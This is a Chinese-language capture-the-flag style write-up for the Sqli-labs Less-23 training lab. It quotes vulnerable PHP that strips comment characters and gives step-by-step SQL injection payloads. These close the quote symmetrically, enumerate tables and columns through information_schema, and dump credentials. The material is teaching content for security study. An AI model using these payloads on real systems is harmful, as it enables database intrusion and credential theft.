## 题目: Sqli-labs Less-23

## 题目描述
页面提示输入 ID 参数进行查询。尝试输入 `?id=1` 页面正常回显，但尝试注入 `?id=1'` 时，页面报错。本关名为 `Error Based - no quotes`，说明在 GET 参数注入时，存在针对特殊符号的过滤。

## 解题思路
根据本地源码审计（或黑盒测试），后台对常见的注释符进行了直接删除：
    $id = preg_replace("/#/", "", $id);
    $id = preg_replace("/--/", "", $id);
    $sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
由于 `#` 和 `--` 被过滤，传统的注释截断法失效。若输入 `?id=1'`，后台拼接后为 `id='1'' LIMIT 0,1`，多出的单引号会导致语法错误。

**破局思路：对称闭合**。既然不能删除尾巴，我们就主动把尾巴补齐。
使用 `?id=1' and '1'='1`，拼接后变为 `id='1' and '1'='1' LIMIT 0,1`，语法完美闭环且逻辑为真。

## 解题步骤
**1. 验证对称闭合**
* **操作**：在地址栏输入：
```text
    ?id=1' and '1'='1
```
* **回显**：页面正常回显 `Dumb / Dumb`，证明对称闭合生效。

**2. 联合查询爆库名**
* **操作**：将前面的 `1` 换成 `-1` 让原查询查不到数据，构造：
```text
    ?id=-1' union select 1,database(),3 where '1'='1
```
* **回显**：页面第 2 列成功回显 `security`。

**3. 查询表名（⚠️ 踩坑记录）**
* **踩坑**：在查表名时，我一开始为了补齐单引号，习惯性地拼接了 `and '1'='1`，结果变成了 `from information_schema.tables where table_schema=database() and '1'='1`。虽然这次侥幸没报错，但在后续脱库时却翻了车。
* **破局**：查询表名。
* **操作**：
```text
    ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() and '1'='1
```
* **回显**：成功得到表名 `emails, referers, uagents, users`。

**4. 查询列名**
* **操作**：
```text
    ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and '1'='1
```
* **回显**：成功得到列名 `USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS, id, username, password`。

**5. 终极脱库（⚠️ 踩坑记录）**
* **踩坑**：我直接拼接了 `from users and '1'='1`，结果页面报错 `You have an error in your SQL syntax; ... near 'and '1'='1' LIMIT 0,1'`。因为 SQL 语法规定，`FROM 表名` 后面不能直接接 `AND`。
* **破局**：将 `and` 换成 `where`，这既补齐了后面的单引号，又完美符合了 SQL 语法。
* **操作**：
```text
    ?id=-1' union select 1,group_concat(username,0x3a,password),3 from users where '1'='1
```
* **回显**：成功爆出所有账号密码 `Dumb:Dumb, Angelina:I-kill-you...`。

## 知识点总结
* **对称闭合**：当注释符（`#`、`--`）被过滤时，利用 `and '1'='1` 或 `where '1'='1` 来补齐后端 SQL 语句的引号，是极其重要的绕过技巧。
* **信息收集（脱库）**：通过 `information_schema` 数据库，可以依次查出表名、列名，最后精准提取目标数据。
* **十六进制拼接**：在 `group_concat` 中，使用 `0x3a` 作为分隔符（冒号），可以避免特殊字符被过滤。
